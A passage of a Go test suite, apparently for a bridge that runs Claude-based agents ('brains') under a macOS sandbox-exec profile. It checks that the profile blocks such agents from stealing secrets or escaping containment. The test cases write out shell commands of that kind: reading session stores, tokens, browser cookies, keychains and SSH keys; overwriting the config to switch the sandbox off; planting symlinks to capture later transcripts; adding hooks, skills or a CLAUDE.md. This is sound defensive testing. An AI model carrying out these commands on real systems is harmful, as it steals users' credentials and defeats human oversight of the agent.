				".config/fridolin/personal-denylist",
			} {
				p := filepath.Join(home, f)
				if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(p, []byte("content of "+f), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			cases := []struct {
				name, cmd string // cmd runs in sh with $HOME set
			}{
				{"read the session store", `cat "$HOME/wa-store/bridge.db"`},
				{"read its write-ahead log", `cat "$HOME/wa-store/bridge.db-wal"`},
				{"read next to it", `cat "$HOME/wa-store/notes.txt"`},
				{"write next to it", `printf x > "$HOME/wa-store/planted"`},
				{"move it aside", `mv "$HOME/wa-store" "$HOME/w2"`},
				{"read the old data dir's store", `cat "$HOME/.whatsapp-claude-bridge/bridge.db"`},
				{"read the old dashboard token", `cat "$HOME/.whatsapp-claude-bridge/dashboard.token"`},
				{"read the bridge log", `cat "$HOME/Library/Logs/fridolin/stderr.log"`},
				{"read the personal-data denylist", `cat "$HOME/.config/fridolin/personal-denylist"`},
			}
			for _, c := range cases {
				t.Run(c.name, func(t *testing.T) {
					if allowed, out := sandboxRun(t, sp, ownDir, "/bin/sh", "-c", c.cmd); allowed {
						t.Errorf("%s was allowed: %q", c.cmd, out)
					}
				})
			}
		})
	}
}

// TestSandboxKeepsRunTokensToTheirBrain: under the real sandbox-exec a
// brain reads the brain API token of its own run, and not the token of
// another brain's run in progress, with which it could call /brain/ as
// that brain. That is why the token is in a file: in the run's
// environment, macOS would show it to every process of the same user,
// sandboxed or not.
func TestSandboxKeepsRunTokensToTheirBrain(t *testing.T) {
	requireSandboxExec(t)
	tb, _ := serveTestBridge(t, `, "sandbox": {"enabled": true}`)
	dirs := map[string]string{
		"a": tb.addFolderBrain(t, BrainManifest{ID: "a", Name: "A", Routing: BrainRouting{HandlesDMs: true}}),
		"g": tb.addFolderBrain(t, BrainManifest{ID: "g", Name: "G", Routing: BrainRouting{Groups: []string{"120363000000000000@g.us"}}}),
	}
	tokenFile := func(brain string) string {
		env, done := tb.brainRunEnv(brain)
		t.Cleanup(done)
		for _, kv := range env {
			if v, ok := strings.CutPrefix(kv, "FRIDOLIN_BRAIN_TOKEN_FILE="); ok {
				return v
			}
		}
		t.Fatalf("brain %s's run got no token file: %q", brain, env)
		return ""
	}
	files := []string{"A=" + tokenFile("a"), "G=" + tokenFile("g")}
	cases := []struct {
		name, brain, cmd string
		allow            bool
	}{
		{"read its own", "a", `cat "$A"`, true},
		{"read another brain's", "a", `cat "$G"`, false},
		{"the other way round", "g", `cat "$A"`, false},
		{"list another brain's", "a", `ls "$(dirname "$G")"`, false},
		{"overwrite its own", "a", `printf x > "$A"`, false},
		{"plant one next to its own", "a", `printf x > "$(dirname "$A")/run-x.token"`, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			bin, argv, err := tb.brainMgr.profiler.Command(c.brain, "/bin/sh", []string{"-c", c.cmd})
			if err != nil {
				t.Fatal(err)
			}
			cmd := exec.Command(bin, argv...)
			cmd.Dir = dirs[c.brain]
			cmd.Env = append(os.Environ(), files...)
			out, err := cmd.CombinedOutput()
			denied := err != nil && strings.Contains(string(out), "Operation not permitted") && !strings.HasPrefix(string(out), "sandbox-exec:")
			if err != nil && !denied {
				t.Fatalf("%s: %v: %s", c.cmd, err, out)
			}
			if allowed := err == nil; allowed != c.allow {
				t.Errorf("%s as brain %s: allowed=%v, want %v (%q)", c.cmd, c.brain, allowed, c.allow, out)
			}
		})
	}
}

// TestSandboxedRunReachesTheBrainAPI: a sandboxed run reads its token from
// the file the bridge wrote for it and asks the bridge, as `fridolin polls`
// does in a real run.
func TestSandboxedRunReachesTheBrainAPI(t *testing.T) {
	requireSandboxExec(t)
	tb, _ := serveTestBridge(t, `, "sandbox": {"enabled": true}`)
	tb.addFolderBrain(t, BrainManifest{ID: "a", Name: "A", Routing: BrainRouting{HandlesDMs: true}})
	savePoll(t, tb, "P1", apiTestDM, "Lunch?", []string{"Yes", "No"}, nil)
	t.Setenv("FRIDOLIN_FAKE_POLLS", "1")
	tb.handleInbound(context.Background(), Inbound{JID: apiTestDM, Sender: "15551234567", Text: "polls?", Source: "whatsapp"})
	waitFor(t, 20*time.Second, "the reply", func() bool { return len(tb.sentTo(apiTestDM)) > 0 })
	if reply := tb.sentTo(apiTestDM)[0]; !strings.Contains(reply, `polls=0 {`) || !strings.Contains(reply, `"question": "Lunch?"`) {
		t.Errorf("the sandboxed run's fridolin polls answered:\n%s", reply)
	}
}

// TestSandboxDeniesBrowserProfiles: under the real sandbox-exec a brain
// reads no browser's profile, where a dashboard session lives, in any
// release channel beside the stable one; other programs' folders in
// Application Support stay readable.
func TestSandboxDeniesBrowserProfiles(t *testing.T) {
	requireSandboxExec(t)
	for _, l := range sandboxLayouts() {
		t.Run(l.name, func(t *testing.T) {
			home := l.home(t)
			t.Setenv("HOME", home)
			sp, ownDir := sandboxFixture(t, home, l.otherBrain, l.denyDir)
			for _, c := range []struct {
				folder string
				want   bool // readable
			}{
				{"Google/Chrome Canary", false},
				{"BraveSoftware/Brave-Browser-Beta", false},
				{"Microsoft Edge", false},
				{"Microsoft Edge Beta", false},
				{"Microsoft Edge Dev", false},
				{"Vivaldi Snapshot", false},
				{"com.operasoftware.OperaGX", false},
				{"com.operasoftware.OperaNext", false},
				{"SomeTool", true},
			} {
				t.Run(c.folder, func(t *testing.T) {
					p := filepath.Join(home, "Library", "Application Support", c.folder, "Default", "Cookies")
					if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
						t.Fatal(err)
					}
					if err := os.WriteFile(p, []byte("cookies"), 0o600); err != nil {
						t.Fatal(err)
					}
					if allowed, out := sandboxRun(t, sp, ownDir, "/bin/cat", p); allowed != c.want {
						t.Errorf("reading %s: allowed %v, want %v (%q)", c.folder, allowed, c.want, out)
					}
				})
			}
		})
	}
}

// TestSandboxDeniesTheConfigFile: a config.json outside the data dir, and
// the .env older versions read next to it, are neither readable nor
// writable under the real sandbox-exec.
func TestSandboxDeniesTheConfigFile(t *testing.T) {
	requireSandboxExec(t)
	home := canonicalDir(t.TempDir())
	t.Setenv("HOME", home)
	// A save in progress: writeFileAtomic writes the whole config here first.
	for _, f := range []string{"etc/config.json", "etc/.env", "etc/.config.json.123456.tmp", "a/notes.md"} {
		p := filepath.Join(home, f)
		if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte("content of "+f), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	sp := NewSandboxProfiler(map[string][]string{"a": {filepath.Join(home, "a")}}, &Config{DataDir: filepath.Join(home, ".fridolin")})
	sp.SetConfigFile(filepath.Join(home, "etc", "config.json"))
	for _, cmd := range []string{
		`cat "$HOME/etc/config.json"`,
		`cat "$HOME/etc/.env"`,
		`cat "$HOME/etc/.config.json.123456.tmp"`,
		`printf '{"sandbox":{"enabled":false}}' > "$HOME/etc/.config.json.654321.tmp"`,
		`printf '{"sandbox":{"enabled":false}}' > "$HOME/etc/config.json"`,
		`mv "$HOME/etc/config.json" "$HOME/a/c.json"`,
	} {
		if allowed, out := sandboxRun(t, sp, filepath.Join(home, "a"), "/bin/sh", "-c", cmd); allowed {
			t.Errorf("%s was allowed: %q", cmd, out)
		}
	}
}

// TestSandboxAllowPathsKeepBridgeSecrets: under the real sandbox-exec, an
// allow_paths entry covering the data dir opens neither the dashboard token
// nor the database, one covering the folder that holds the brains opens no
// other brain, and one covering ~/Library opens no keychain, while the
// brain's inbox stays readable and an entry inside a default-denied home
// folder still works.
func TestSandboxAllowPathsKeepBridgeSecrets(t *testing.T) {
	requireSandboxExec(t)
	home := canonicalDir(t.TempDir())
	t.Setenv("HOME", home)
	// Ready for inboxes, as the bridge has it before any run, so that a's
	// photo stays in a's inbox.
	if err := retireLegacyMedia(filepath.Join(home, ".fridolin", "media")); err != nil {
		t.Fatal(err)
	}
	for _, f := range []string{".fridolin/dashboard.token", ".fridolin/bridge.db", ".fridolin/media/a/photo.jpg", "Documents/share/ok.txt", "a/notes.md", "team/b/diary.md", "Library/Keychains/login.keychain-db", "Library/Preferences/x.plist"} {
		p := filepath.Join(home, f)
		if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte("content of "+f), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	cfg := &Config{
		DataDir: filepath.Join(home, ".fridolin"),
		DBPath:  filepath.Join(home, ".fridolin", "bridge.db"),
		Sandbox: SandboxConfig{AllowPaths: []string{filepath.Join(home, ".fridolin"), filepath.Join(home, "team"), filepath.Join(home, "Documents", "share"), filepath.Join(home, "Library")}},
	}
	sp := NewSandboxProfiler(map[string][]string{"a": {filepath.Join(home, "a")}, "b": {filepath.Join(home, "team", "b")}}, cfg)
	for _, c := range []struct {
		path         string
		write, allow bool
	}{
		{".fridolin/dashboard.token", false, false},
		{".fridolin/bridge.db", false, false},
		{"team/b/diary.md", false, false},
		{"team/b/planted.md", true, false},
		{".fridolin/media/a/photo.jpg", false, true},
		{"Documents/share/ok.txt", false, true},
		{"Library/Preferences/x.plist", false, true},
		{"Library/Keychains/login.keychain-db", false, false},
	} {
		if allowed, out := sandboxTry(t, sp, filepath.Join(home, "a"), c.write, filepath.Join(home, c.path)); allowed != c.allow {
			t.Errorf("%s (write %v): allowed=%v, want %v (output %q)", c.path, c.write, allowed, c.allow, out)
		}
	}
}

// TestSandboxRefusesLinksIntoSessionRecords: a brain could link a project
// folder the CLI had not created yet into its own folder. The next session
// of that project, yours included, then wrote its transcript through the
// link, and the brain read it there. A brain with a config dir of its own
// cannot write among your sessions' records at all. One that shares yours
// (inherit_claude_user_config) writes its own run's records there, but
// under the real sandbox-exec no symlink can be planted among them,
// neither made there, moved there nor hard-linked there, while the folders
// and files the CLI itself creates still can be.
func TestSandboxRefusesLinksIntoSessionRecords(t *testing.T) {
	requireSandboxExec(t)
	cases := []struct {
		name, cmd string // cmd runs in sh with $HOME and $L, a folder of the brain's own, set
		shared    bool   // allowed with a shared config dir; never without
	}{
		{"link a new project folder into its own", `ln -s "$L" "$HOME/.claude/projects/-Users-you-new1"`, false},
		{"move a link there", `ln -s "$L" "$L.link" && mv "$L.link" "$HOME/.claude/projects/-Users-you-new2"`, false},
		{"hard-link a link there", `ln -s "$L" "$L.link2" && ln -P "$L.link2" "$HOME/.claude/projects/-Users-you-new4"`, false},
		{"link a file into an existing project", `ln -s "$L/s.jsonl" "$HOME/.claude/projects/p/s2.jsonl"`, false},
		{"link a session file", `ln -s "$L/1.json" "$HOME/.claude/sessions/99999.json"`, false},
		{"create a new project folder, as the CLI does", `mkdir "$HOME/.claude/projects/-Users-you-new3" && printf '{}' > "$HOME/.claude/projects/-Users-you-new3/s.jsonl"`, true},
		{"create a session file, as the CLI does", `printf '{}' > "$HOME/.claude/sessions/1.json"`, true},
	}
	for _, l := range sandboxLayouts() {
		for _, shared := range []bool{false, true} {
			t.Run(fmt.Sprintf("%s/inherit_claude_user_config=%v", l.name, shared), func(t *testing.T) {
				home := l.home(t)
				t.Setenv("HOME", home)
				sp, ownDir := sandboxFixture(t, home, l.otherBrain, l.denyDir, map[string]any{"inherit_claude_user_config": shared})
				for _, d := range []string{".claude/projects/p", ".claude/sessions"} {
					if err := os.MkdirAll(filepath.Join(home, d), 0o700); err != nil {
						t.Fatal(err)
					}
				}
				loot := filepath.Join(ownDir, "loot")
				if err := os.Mkdir(loot, 0o700); err != nil {
					t.Fatal(err)
				}
				t.Setenv("L", loot)
				for _, c := range cases {
					t.Run(c.name, func(t *testing.T) {
						if allowed, out := sandboxRun(t, sp, ownDir, "/bin/sh", "-c", c.cmd); allowed != (shared && c.shared) {
							t.Errorf("%s: allowed=%v, want %v (output %q)", c.cmd, allowed, shared && c.shared, out)
						}
					})
				}
				// What a later session writes there, outside the sandbox, stays
				// out of the brain's folder.
				for _, f := range []string{".claude/projects/-Users-you-new1/s.jsonl", ".claude/projects/-Users-you-new2/s.jsonl"} {
					p := filepath.Join(home, f)
					if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
						t.Fatal(err)
					}
					if err := os.WriteFile(p, []byte("your transcript"), 0o600); err != nil {
						t.Fatal(err)
					}
				}
				if entries, err := os.ReadDir(loot); err != nil || len(entries) > 0 {
					t.Errorf("the brain's folder got %v (%v)", entries, err)
				}
			})
		}
	}
}

// TestSandboxLetsTheCLICreateItsState: with inherit_claude_user_config a
// brain shares your config dir, and on a home where the Claude CLI never
// ran, ~/.claude does not exist yet. It is pinned, but only against rename
// and delete: the CLI must still be able to create it and write its state,
// and the brain must not be able to move it once it exists. Nor can the
// brain create it, or a missing folder in it, as a symlink into its own
// folder, where what the CLI and your own sessions write there would land.
// Each step builds the profile afresh, as each run does.
func TestSandboxLetsTheCLICreateItsState(t *testing.T) {
	requireSandboxExec(t)
	home := canonicalDir(t.TempDir())
	t.Setenv("HOME", home)
	sp, ownDir := sandboxFixture(t, home, "b", "clients", map[string]any{"inherit_claude_user_config": true})
	if _, err := os.Stat(filepath.Join(home, ".claude")); !os.IsNotExist(err) {
		t.Fatalf("~/.claude exists before the run: %v", err)
	}
	t.Setenv("L", filepath.Join(ownDir, "loot"))
	steps := []struct {
		name  string
		cmd   string
		allow bool
	}{
		{"link a missing ~/.claude into its own folder", `mkdir -p "$L" && ln -s "$L" "$HOME/.claude"`, false},
		{"create ~/.claude", `mkdir "$HOME/.claude"`, true},
		{"link a missing sessions folder into its own folder", `ln -s "$L" "$HOME/.claude/sessions"`, false},
		{"link a missing transcripts folder into its own folder", `ln -s "$L" "$HOME/.claude/projects"`, false},
		{"create its state", `mkdir -p "$HOME/.claude/projects/x" "$HOME/.claude/sessions" && printf '{}' > "$HOME/.claude/projects/x/s.jsonl" && printf '{}' > "$HOME/.claude/sessions/1.json" && printf '{}' > "$HOME/.claude.json"`, true},
		{"move ~/.claude away", `mv "$HOME/.claude" "$HOME/c2"`, false},
		{"move the transcripts away", `mv "$HOME/.claude/projects" "$HOME/p2"`, false},
		{"write your settings", `printf '{"hooks":{}}' > "$HOME/.claude/settings.json"`, false},
		{"add a skill", `mkdir -p "$HOME/.claude/skills/x" && printf x > "$HOME/.claude/skills/x/SKILL.md"`, false},
		{"start a project's auto-memory", `mkdir -p "$HOME/.claude/projects/x/memory"`, false},
	}
	for _, s := range steps {
		allowed, out := sandboxRun(t, sp, ownDir, "/bin/sh", "-c", s.cmd)
		if allowed != s.allow {
			t.Errorf("%s: allowed=%v, want %v (output %q)", s.name, allowed, s.allow, out)
		}
	}
}

// TestSandboxOwnFolderKeepsWhatIsInsideIt: under the real sandbox-exec, a
// deny_paths entry inside a brain's folder wins over the folder, as one
// anywhere else does over the defaults: the brain can neither read nor
// write it, nor move it or the folder above it out from under its rule,
// while an allow_paths entry inside opens reading again. A brain whose
// folder holds what the bridge keeps for itself, such as the data dir, or
// is your home folder, is refused outright: its folder rule used to win
// over every deny inside it.
func TestSandboxOwnFolderKeepsWhatIsInsideIt(t *testing.T) {
	requireSandboxExec(t)
	home := canonicalDir(t.TempDir())
	t.Setenv("HOME", home)
	box := filepath.Join(home, "box")
	for _, f := range []string{"notes.md", "work/private/contract.txt", "work/private/share/ok.txt"} {
		p := filepath.Join(box, f)
		if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte("content of "+f), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	cfg := &Config{DataDir: home + "/.fridolin", Sandbox: SandboxConfig{
		DenyPaths:  []string{box + "/work/private"},
		AllowPaths: []string{box + "/work/private/share"},
	}}
	sp := NewSandboxProfiler(map[string][]string{"a": {box}}, cfg)
	cases := []struct {
		name, cmd string // cmd runs in sh with $B set to the brain's folder
		allow     bool
	}{
		{"read its own notes", `cat "$B/notes.md"`, true},
		{"write a file of its own", `printf x > "$B/new.md"`, true},
		{"read a deny_paths entry inside it", `cat "$B/work/private/contract.txt"`, false},
		{"write into it", `printf x > "$B/work/private/planted"`, false},
		{"read an allow_paths folder inside that", `cat "$B/work/private/share/ok.txt"`, true},
		{"move the entry aside", `mv "$B/work/private" "$B/p2"`, false},
		{"move the folder above it aside", `mv "$B/work" "$B/w2"`, false},
		{"move its own folder, and all of it with it", `mv "$B" "$B.moved"`, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			t.Setenv("B", box)
			if allowed, out := sandboxRun(t, sp, box, "/bin/sh", "-c", c.cmd); allowed != c.allow {
				t.Errorf("%s: allowed=%v, want %v (output %q)", c.cmd, allowed, c.allow, out)
			}
		})
	}

	for name, dir := range map[string]string{"your home folder": home, "a folder holding the data dir": filepath.Dir(cfg.DataDir) + "/x/.."} {
		t.Run("a brain at "+name+" is refused", func(t *testing.T) {
			sp := NewSandboxProfiler(map[string][]string{"a": {filepath.Clean(dir)}}, cfg)
			if bin, args, err := sp.Command("a", "/bin/cat", []string{cfg.DataDir + "/dashboard.token"}); err == nil {
				t.Errorf("Command = %s %q, want it refused", bin, args)
			}
		})
	}
}

// TestSandboxPinsItsOwnFolder: a brain could move its own folder aside and
// leave a symlink in its place. One to another brain's folder failed that
// brain's next profile (its folder had become one this brain's profile
// denies); one to HOME failed every profile; and the bridge, which reads and
// appends a brain's history in its folder outside the sandbox, followed the
// link. Under the real sandbox-exec the folder cannot be moved, by either
// spelling, while everything inside it stays the brain's to change.
func TestSandboxPinsItsOwnFolder(t *testing.T) {
	requireSandboxExec(t)
	cases := []struct {
		name, cmd string // cmd runs in sh with $A, $R, $B and $HOME set
		allow     bool
	}{
		{"swap it for a link to another brain", `mv "$A" "$A.old" && ln -s "$B" "$A"`, false},
		{"swap it for a link to HOME", `mv "$A" "$A.old" && ln -s "$HOME" "$A"`, false},
		{"swap it by its real path", `mv "$R" "$R.old" && ln -s "$B" "$R"`, false},
		{"rename a file inside it", `mv "$A/notes.md" "$A/n2.md" && mv "$A/n2.md" "$A/notes.md"`, true},
		{"make and remove a folder inside it", `mkdir "$A/sub" && rmdir "$A/sub"`, true},
	}
	for _, l := range sandboxLayouts() {
		t.Run(l.name, func(t *testing.T) {
			home := l.home(t)
			t.Setenv("HOME", home)
			sp, ownDir := sandboxFixture(t, home, l.otherBrain, l.denyDir)
			configured := filepath.Join(home, "assistant", "a")
			real, err := filepath.EvalSymlinks(configured)
			if err != nil {
				t.Fatal(err)
			}
			t.Setenv("A", configured)
			t.Setenv("R", real)
			t.Setenv("B", filepath.Join(home, "assistant", l.otherBrain))
			for _, c := range cases {
				t.Run(c.name, func(t *testing.T) {
					if allowed, out := sandboxRun(t, sp, ownDir, "/bin/sh", "-c", c.cmd); allowed != c.allow {
						t.Errorf("%s: allowed=%v, want %v (output %q)", c.cmd, allowed, c.allow, out)
					}
				})
			}
			if fi, err := os.Lstat(real); err != nil || !fi.IsDir() {
				t.Errorf("brain a's folder is no longer a folder: %v, %v", fi, err)
			}
			for _, id := range []string{"a", "b"} {
				if _, err := sp.Profile(id); err != nil {
					t.Errorf("Profile(%s) after the attempts: %v", id, err)
				}
			}
		})
	}
}

// TestSandboxOpensItsOwnFolderThroughASymlink: the sandbox matches real
// paths, and a brain runs in its folder's real path. With ~/assistant a
// symlink to ~/Documents/assistant, a profile that allowed the folder only
// as configured left the default ~/Documents deny in force for it, and the
// brain could neither read its prompt and memories nor write its history.
// Under the real sandbox-exec the brain reaches its own files by either
// spelling, while the rest of ~/Documents and the other brain stay closed.
func TestSandboxOpensItsOwnFolderThroughASymlink(t *testing.T) {
	requireSandboxExec(t)
	home := canonicalDir(t.TempDir())
	if err := os.MkdirAll(filepath.Join(home, "Documents", "assistant"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(home, "Documents", "assistant"), filepath.Join(home, "assistant")); err != nil {
		t.Fatal(err)
	}
	t.Setenv("HOME", home)
	sp, ownDir := sandboxFixture(t, home, "b", "clients")
	if want := filepath.Join(home, "Documents", "assistant", "a"); ownDir != want {
		t.Fatalf("brain a runs in %s, want %s", ownDir, want)
	}
	cases := []struct {
		name, cmd string // cmd runs in sh with $A, $R, $B, $RB and $HOME set
		allow     bool
	}{
		{"read its prompt", `cat "$A/brain-prompt.md"`, true},
		{"read its prompt by its real path", `cat "$R/brain-prompt.md"`, true},
		{"write a memory", `printf x > "$A/memories/new.md"`, true},
		{"write a memory by its real path", `printf x > "$R/memories/new2.md"`, true},
		{"rename a file inside it", `mv "$R/notes.md" "$R/n2.md" && mv "$A/n2.md" "$A/notes.md"`, true},
		{"read the other brain's prompt", `cat "$B/brain-prompt.md"`, false},
		{"read the other brain's prompt by its real path", `cat "$RB/brain-prompt.md"`, false},
		{"read the rest of Documents", `cat "$HOME/Documents/private.txt"`, false},
		{"write the brains folder's CLAUDE.md", `printf obey > "$HOME/assistant/CLAUDE.md"`, false},
		{"move its own folder by its real path", `mv "$R" "$R.old"`, false},
	}
	t.Setenv("A", filepath.Join(home, "assistant", "a"))
	t.Setenv("R", ownDir)
	t.Setenv("B", filepath.Join(home, "assistant", "b"))
	t.Setenv("RB", filepath.Join(home, "Documents", "assistant", "b"))
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if allowed, out := sandboxRun(t, sp, ownDir, "/bin/sh", "-c", c.cmd); allowed != c.allow {
				t.Errorf("%s: allowed=%v, want %v (output %q)", c.cmd, allowed, c.allow, out)
			}
		})
	}
}

// TestSandboxKeepsAMediaFolderOutsideTheDataDir: media_dir can put the
// media folder outside the data dir, whose deny then does not cover it.
// Under the real sandbox-exec a brain still reads and writes only its own
// inbox there: not another brain's, not an attachment on its way to the
// brain of its chat, not a file at the top, and it cannot list the folder.
func TestSandboxKeepsAMediaFolderOutsideTheDataDir(t *testing.T) {
	requireSandboxExec(t)
	home := canonicalDir(t.TempDir())
	t.Setenv("HOME", home)
	sp, own := sandboxFixture(t, home, "b", "clients", map[string]any{"media_dir": "~/media"})
	for _, f := range []string{"media/a/photo.jpg", "media/b/dm.pdf", "media/" + incomingMediaDir + "/voice.ogg", "media/top.pdf"} {
		writeTestFile(t, filepath.Join(home, f), "content of "+f)
	}
	t.Setenv("M", filepath.Join(home, "media"))
	cases := []struct {
		name, cmd string // cmd runs in sh with $M, the media folder, set
		allow     bool
	}{
		{"read its own inbox", `cat "$M/a/photo.jpg"`, true},
		{"write its own inbox", `printf x > "$M/a/new.jpg"`, true},
		{"read another brain's inbox", `cat "$M/b/dm.pdf"`, false},
		{"write another brain's inbox", `printf x > "$M/b/planted.pdf"`, false},
		{"read an attachment not yet routed", `cat "$M/` + incomingMediaDir + `/voice.ogg"`, false},
		{"read a file at the top", `cat "$M/top.pdf"`, false},
		{"write at the top", `printf x > "$M/planted.pdf"`, false},
		{"list the media folder", `ls "$M"`, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if allowed, out := sandboxRun(t, sp, own, "/bin/sh", "-c", c.cmd); allowed != c.allow {
				t.Errorf("%s: allowed=%v, want %v (output %q)", c.cmd, allowed, c.allow, out)
			}
		})
	}
}

// TestSandboxLetsBrainsRefreshASharedPlaudLogin: with plaud.brain_access a
// brain runs the Plaud CLI with your login in ~/.plaud, and the CLI
// (0.3.15) saves a refreshed login as the refresh commands here do: it
// sets the modes of ~/.plaud and tokens.json and rewrites the file in
// place. With writing denied by default the save failed, so the brain's
// command failed as not logged in, and a refresh token Plaud had rotated
// was lost, which signed Plaud out. Under the real sandbox-exec the brain
// now saves it, and writes nothing else there; without brain_access it
// cannot even read the login. Nor can it remove the file or put a symlink
// in its place: the bridge's own Plaud CLI, outside the sandbox, would
// write your next sign-in through it, and chmod what it points to. The
// folder is 0755 here and the file 0644, as ones made by hand may be: the
// sandbox checks only a chmod that changes the mode.
func TestSandboxLetsBrainsRefreshASharedPlaudLogin(t *testing.T) {
	requireSandboxExec(t)
	refresh := `P="$HOME/.plaud" && mkdir -p "$P" && chmod 700 "$P" && chmod 600 "$P/tokens.json" && printf '{"access_token":"new"}' > "$P/tokens.json"`
	type plaudCase struct {
		name   string
		access bool // plaud.brain_access
		cmd    string
		allow  bool
	}
	cases := []plaudCase{
		{"refresh the login", true, refresh, true},
		{"read the login", true, `cat "$HOME/.plaud/tokens.json"`, true},
		{"write its configuration", true, `printf 'refresh_url: x' > "$HOME/.plaud/cli.yaml"`, false},
		{"move the folder aside", true, `mv "$HOME/.plaud" "$HOME/p2"`, false},
		{"remove the login", true, `rm "$HOME/.plaud/tokens.json"`, false},
		{"move the login aside", true, `mv "$HOME/.plaud/tokens.json" "$HOME/.plaud/old.json"`, false},
		{"replace the login with a symlink", true, `rm "$HOME/.plaud/tokens.json"; ln -s "$HOME/.zshrc" "$HOME/.plaud/tokens.json"`, false},
		{"link over the login", true, `ln -sf "$HOME/Library/LaunchAgents/x.plist" "$HOME/.plaud/tokens.json"`, false},
		{"refresh the login without brain_access", false, refresh, false},
		{"read the login without brain_access", false, `cat "$HOME/.plaud/tokens.json"`, false},
	}
	if node, err := exec.LookPath("node"); err == nil {
		// The CLI's own save, TokenStore.save, in node.
		save := `const fs = require("fs/promises"), path = require("path"), os = require("os");
const dir = path.join(os.homedir(), ".plaud"), file = path.join(dir, "tokens.json");
(async () => {
  await fs.mkdir(dir, {recursive: true, mode: 0o700});
  await fs.chmod(dir, 0o700);
  await fs.chmod(file, 0o600);
  await fs.writeFile(file, '{"access_token":"new"}', {encoding: "utf-8", mode: 0o600});
})().catch((e) => { console.error(e.code === "EPERM" ? "Operation not permitted: " + e.message : e.message); process.exit(1); });`
		cases = append(cases, plaudCase{"refresh the login as the Plaud CLI does", true, shellQuote(node) + " -e " + shellQuote(save), true})
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			home := canonicalDir(t.TempDir())
			t.Setenv("HOME", home)
			sp, own := sandboxFixture(t, home, "b", "clients", map[string]any{"plaud": map[string]any{"brain_access": c.access}})
			if err := os.Mkdir(filepath.Join(home, ".plaud"), 0o755); err != nil {
				t.Fatal(err)
			}
			tokens := writeTestFile(t, filepath.Join(home, ".plaud", "tokens.json"), `{"access_token":"old"}`)
			if err := os.Chmod(tokens, 0o644); err != nil {
				t.Fatal(err)
			}
			if allowed, out := sandboxRun(t, sp, own, "/bin/sh", "-c", c.cmd); allowed != c.allow {
				t.Errorf("%s: allowed=%v, want %v (output %q)", c.cmd, allowed, c.allow, out)
			}
			fi, err := os.Lstat(tokens)
			if err != nil || !fi.Mode().IsRegular() {
				t.Fatalf("tokens.json is no longer the login: %v, %v", fi, err)
			}
			want := `{"access_token":"old"}`
			if c.allow && strings.HasPrefix(c.name, "refresh") {
				want = `{"access_token":"new"}`
			}
			if data, _ := os.ReadFile(tokens); string(data) != want {
				t.Errorf("tokens.json = %q, want %q", data, want)
			}
		})
	}
}

// symlinkedHome makes HOME a symlink, and the data dir, the credentials
// dir, the deny path, ~/.ssh and the brains' parent folder symlinks out of
// it, the way a home on another volume or a cloud-synced folder looks.
func symlinkedHome(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	realHome := filepath.Join(root, "home-real")
	if err := os.Mkdir(realHome, 0o700); err != nil {
		t.Fatal(err)
	}
	links := map[string]string{filepath.Join(root, "home"): realHome}
	for _, d := range []string{".fridolin", "creds", "clients", ".ssh", "assistant"} {
		links[filepath.Join(realHome, d)] = filepath.Join(root, "elsewhere", strings.TrimPrefix(d, "."))
	}
	for link, target := range links {
		if err := os.MkdirAll(target, 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink(target, link); err != nil {
			t.Fatal(err)
		}
	}
	return filepath.Join(root, "home")
}

// sandboxFixture writes a config with folder brains a and b, a credentials
// dir, a deny path and an allow path, plus any extra top-level settings,
// loads it the way the bridge does, and creates one file for every check.
// It returns the profiler and a's folder.
func sandboxFixture(t *testing.T, home, otherBrain, denyDir string, extra ...map[string]any) (*SandboxProfiler, string) {
	t.Helper()
	settings := map[string]any{
		"brain_mode": true,
		"data_dir":   "~/.fridolin",
		"sandbox": map[string]any{
			"enabled":         true,
			"credentials_dir": "~/creds",
			"deny_paths":      []string{"~/" + denyDir},
			"allow_paths":     []string{"~/Documents/share"},
		},
		"brain_dirs": []BrainRef{
			brainFolder(t, "~/assistant/a", BrainManifest{ID: "a", Routing: BrainRouting{HandlesDMs: true}}),
			brainFolder(t, "~/assistant/"+otherBrain, BrainManifest{ID: "b", Routing: BrainRouting{Groups: []string{"120363000000000000@g.us"}}}),
		},
	}
	for _, e := range extra {
		for k, v := range e {
			settings[k] = v
		}
	}
	cfgJSON, err := json.Marshal(settings)
	if err != nil {
		t.Fatal(err)
	}
	cfg, err := LoadConfig(writeConfig(t, string(cfgJSON)))
	if err != nil {
		t.Fatal(err)
	}
	// The bridge opens its database before the brains, and the checks need
	// the real file.
	store, err := NewStore(cfg)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { store.Close() })
	mgr := newTestManager(t, cfg)
	t.Cleanup(mgr.Stop)

	for _, f := range []string{
		"assistant/a/notes.md",
		"assistant/" + otherBrain + "/diary.md",
		".fridolin/dashboard.token",
		".fridolin/media/a/photo.jpg",
		".fridolin/media/b/dm.pdf",
		".fridolin/media/.incoming/voice.ogg",
		"creds/google_calendar_token_a.json",
		"creds/google_calendar_token_b.json",
		".ssh/id_ed25519",
		"Library/Keychains/login.keychain-db",
		denyDir + "/contract.txt",
		"Documents/private.txt",
		"Documents/share/ok.txt",
	} {
		p := filepath.Join(home, f)
		if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte("content of "+f), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	if _, err := os.Stat(cfg.DBPath); err != nil {
